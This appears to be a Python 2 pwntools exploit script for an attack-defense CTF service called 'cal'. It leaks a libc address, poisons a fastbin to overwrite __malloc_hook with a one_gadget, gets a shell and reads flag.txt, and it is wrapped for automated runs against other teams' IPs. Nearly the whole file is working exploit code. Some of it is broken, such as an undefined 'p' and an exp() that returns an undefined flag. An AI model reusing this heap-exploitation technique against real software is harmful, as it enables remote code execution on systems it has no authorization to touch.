from pwn import *

def auto_get_submit(ip,port):
    def pwn(ip,port):

        def com1(data,size):
            io.sendlineafter("com:",'1')
            io.sendlineafter("line",data)
            if size:
                io.sendlineafter('size',str(size))

        #io=process("./cal",env={"LD_PRELOAD":"./libc-2.23.so"})
        io = remote(ip,port,timeout=10)
        #gdb.attach(io)
        # context.log_level='debug'
        com1('0="1"',0x60)
        com1('1="2"',0x80)
        com1('2="3"',0x60)
        com1('3="4"',0x60)
        com1('4="5"',0x60)
        com1('3=#',0)
        com1('2=#',0)
        com1('1=#',0)
        com1('0=#',0)
        com1('5="'+'a'*0x60+'b'*0x10+'"',0x60)
        io.recvuntil('b'*0x10)
        libc=u64(io.recvline()[:-1].ljust(8,'\0'))-0x3c4b78
        one=libc+0xf1147
        malloc=libc+0x3c4aed
        com1('6="'+'a'*0x68+p64(0x71)+p64(malloc)+'"',0x60)
        print hex(one)
        com1('7="'+'a'*0x13+p64(one)+'"',0x60)
        com1('9="'+'a'*0x13+p64(one)+'"',0x60)
        com1('8="1"',0x60)

        io.recv()
        # io.interactive()
        io.sendline("cat flag.txt")
        flag = io.recv()
        flag = flag[:-1]
        # print len(flag)
        if len(flag) == 16:
            return flag
        flag = io.recv()
        flag = flag[:-1]
        if len(flag) == 16:
            return flag
        flag = p.recv()
        flag = flag[:-1]
        if len(flag) == 16:
            return flag


    def exp(ip,port):
        return flag

        '''
        You can add this to return flag!

        io.sendline("cat flag")
        flag = io.recv()
        flag = flag[:-1]
        print len(flag)
        if len(flag) == 192:
            return flag
        
        flag = io.recv()
        flag = flag[:-1]
        print len(flag)
        if len(flag) == 192:
            return flag
        
        flag = io.recv()
        flag = flag[:-1]
        print len(flag)
        if len(flag) == 192:
            return flag
        
        '''

    def submit_flag(flag,token):
        pass


    
    flag = pwn(ip,port)
    print flag
    token=''
    # submit_flag(flag,token)
# auto_get_submit('192.168.43.252',10000)
